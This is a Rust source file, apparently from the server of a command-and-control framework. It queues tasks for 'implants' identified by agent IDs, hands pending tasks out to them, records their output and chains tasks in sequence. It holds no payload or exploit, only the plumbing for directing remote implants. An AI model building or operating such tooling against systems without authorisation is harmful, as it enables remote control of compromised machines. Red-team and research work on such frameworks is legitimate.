use crate::protocol::tasks::TaskType;
use crate::protocol::wire::TaskEntry;
use crate::storage::db::{Database, FullTaskRow};
use serde::Serialize;
use std::sync::Arc;

#[derive(Debug, Clone, Serialize)]
pub struct TaskInfo {
    pub id: i64,
    pub agent_id: String,
    pub task_type: String,
    pub task_type_id: u8,
    pub status: String,
    pub created_at: String,
    pub dispatched_at: Option<String>,
    pub completed_at: Option<String>,
    pub output: Option<String>,
    pub success: Option<bool>,
}

impl From<FullTaskRow> for TaskInfo {
    fn from(row: FullTaskRow) -> Self {
        let type_name = TaskType::from_u8(row.task_type)
            .map(|t| t.name())
            .unwrap_or("unknown");
        Self {
            id: row.id,
            agent_id: hex::encode(row.agent_id),
            task_type: type_name.to_string(),
            task_type_id: row.task_type,
            status: row.status,
            created_at: row.created_at,
            dispatched_at: row.dispatched_at,
            completed_at: row.completed_at,
            output: row.output.map(|o| String::from_utf8_lossy(&o).to_string()),
            success: row.success.map(|s| s != 0),
        }
    }
}

pub struct TaskQueue {
    db: Arc<Database>,
}

impl TaskQueue {
    pub fn new(db: Arc<Database>) -> Self {
        Self { db }
    }

    pub fn enqueue(
        &self,
        agent_id: &[u8; 16],
        task_type: u8,
        data: &[u8],
    ) -> Result<i64, String> {
        if TaskType::from_u8(task_type).is_none() {
            return Err(format!("unknown task type: {}", task_type));
        }
        self.db
            .queue_task(agent_id, task_type, data)
            .map_err(|e| format!("db error: {}", e))
    }

    pub fn drain_for_implant(&self, agent_id: &[u8; 16]) -> Result<Vec<TaskEntry>, String> {
        let rows = self
            .db
            .drain_pending_tasks(agent_id)
            .map_err(|e| format!("db error: {}", e))?;

        let entries: Result<Vec<_>, _> = rows
            .into_iter()
            .map(|row| {
                let task_type = TaskType::from_u8(row.task_type)
                    .ok_or_else(|| format!("invalid task type: {}", row.task_type))?;
                Ok(TaskEntry {
                    id: row.id as u32,
                    task_type,
                    data: row.data,
                })
            })
            .collect();
        entries
    }

    pub fn complete(
        &self,
        task_id: i64,
        success: bool,
        output: &[u8],
    ) -> Result<bool, String> {
        let completed = self
            .db
            .complete_task(task_id, success, output)
            .map_err(|e| format!("db error: {}", e))?;

        if completed {
            if let Ok(Some(task)) = self.db.get_task(task_id) {
                if let Some(chain_id) = task.chain_id {
                    let _ = self.db.advance_chain(chain_id);
                }
            }
        }
        Ok(completed)
    }

    pub fn enqueue_chain(
        &self,
        agent_id: &[u8; 16],
        tasks: &[(u8, Vec<u8>)],
    ) -> Result<(i64, Vec<i64>), String> {
        if tasks.is_empty() {
            return Err("empty chain".into());
        }
        for (tt, _) in tasks {
            if TaskType::from_u8(*tt).is_none() {
                return Err(format!("unknown task type: {}", tt));
            }
        }
        let chain_id = self
            .db
            .create_chain(agent_id, tasks.len() as i64)
            .map_err(|e| format!("db error: {}", e))?;

        let mut task_ids = Vec::new();
        for (seq, (tt, data)) in tasks.iter().enumerate() {
            let tid = self
                .db
                .queue_chained_task(agent_id, *tt, data, chain_id, seq as i64)
                .map_err(|e| format!("db error: {}", e))?;
            task_ids.push(tid);
        }
        Ok((chain_id, task_ids))
    }

    pub fn get(&self, task_id: i64) -> Result<Option<TaskInfo>, String> {
        self.db
            .get_task(task_id)
            .map(|opt| opt.map(TaskInfo::from))
            .map_err(|e| format!("db error: {}", e))
    }

    pub fn list_for_implant(&self, agent_id: &[u8; 16]) -> Result<Vec<TaskInfo>, String> {
        self.db
            .list_tasks_for_implant(agent_id)
            .map(|rows| rows.into_iter().map(TaskInfo::from).collect())
            .map_err(|e| format!("db error: {}", e))
    }
}
